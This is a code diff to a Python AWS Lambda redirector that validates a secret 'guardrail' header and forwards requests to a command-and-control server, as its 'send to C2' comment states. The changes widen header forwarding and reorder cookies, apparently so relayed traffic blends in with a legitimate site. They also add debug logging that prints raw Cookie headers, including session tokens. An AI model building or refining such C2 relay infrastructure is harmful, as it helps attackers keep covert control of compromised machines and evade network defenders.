@@ -2,6 +2,7 @@
 import os
 import sys
 import base64
+import hashlib
 import urllib.request
 import urllib.error
 
@@ -32,6 +33,9 @@ def lambda_handler(event, context):
     if DEBUG:
         print(f'[DEBUG] Full event: {event}')
         print(f'[DEBUG] {method} {path}')
+        if 'Cookie' in headers or 'cookie' in headers:
+            cookie_key = 'Cookie' if 'Cookie' in headers else 'cookie'
+            print(f'[DEBUG] Original Cookie header: {headers[cookie_key]}')
 
     # 2. VALIDATE: enforce guardrail
     guardrail = next((v for k, v in headers.items() if k.lower() == GUARDRAIL_HEADER.lower()), None)
@@ -43,9 +47,21 @@ def lambda_handler(event, context):
     if DEBUG:
         print(f'[DEBUG] Guardrail validated')
 
-    # Filter out guardrail, AWS infra, CloudFront, and Host headers before forwarding
-    aws_headers = {'x-amzn-trace-id', 'x-forwarded-port', 'x-forwarded-proto', 'host', 'via', GUARDRAIL_HEADER.lower()}
-    forwarded_headers = {k: v for k, v in headers.items() if k.lower() not in aws_headers and not k.lower().startswith('cloudfront-')}
+    # Forward all headers except those we must remove
+    # Remove only: AWS infrastructure, guardrail, and Host (which urllib will auto-generate)
+    headers_to_remove = {'x-amzn-trace-id', 'x-forwarded-port', 'x-forwarded-proto', 'host', GUARDRAIL_HEADER.lower()}
+    forwarded_headers = {k: v for k, v in headers.items() if k.lower() not in headers_to_remove}
+
+    # Fix API Gateway cookie reordering: ensure skin=noskin comes before session-token
+    if 'Cookie' in forwarded_headers:
+        cookie = forwarded_headers['Cookie']
+        if 'session-token=' in cookie and 'skin=noskin' in cookie and not cookie.startswith('skin=noskin'):
+            # Cookies are out of order; rebuild as: skin=noskin;session-token=...
+            parts = [p.strip() for p in cookie.split(';')]
+            skin = [p for p in parts if p.startswith('skin=')]
+            rest = [p for p in parts if not p.startswith('skin=')]
+            if skin:
+                forwarded_headers['Cookie'] = skin[0] + ';' + ';'.join(rest)
 
     # 3. RECONSTRUCT: build upstream request
     stage = event.get('requestContext', {}).get('stage', 'v2')
@@ -65,11 +81,15 @@ def lambda_handler(event, context):
     else:
         data = None
 
+
     if DEBUG:
         print(f'[DEBUG] Forwarding headers: {forwarded_headers}')
+        if 'Cookie' in forwarded_headers:
+            print(f'[DEBUG] Forwarded Cookie: {forwarded_headers["Cookie"]}')
 
     if DEBUG:
         print(f'[DEBUG] Forwarding to {url}')
+        print(f'[DEBUG] Request Content-Length: {len(data) if data else 0}')
 
     # 4. FORWARD: send to C2
     try:
